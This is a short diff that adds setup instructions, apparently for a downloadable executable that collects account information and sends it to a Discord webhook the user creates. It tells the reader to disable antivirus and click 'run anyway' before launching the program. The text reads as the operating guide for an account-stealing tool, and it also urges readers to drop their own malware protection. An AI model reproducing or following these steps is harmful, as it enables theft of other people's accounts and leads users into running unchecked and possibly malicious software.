@@ -1,0 +1,5 @@
+step 0: download the exe and disable antivirus or the assets will nott be downloaded and the software will not work "click run anyway  
+step 1: Launch up the application 
+step 2: make a discord server and grab the web key (server settings -> integrations ) 
+step 3:paste it in the the box named "discord webkey" this is where all the accounts information will be located
+step 4: all of the next steps will be on the application
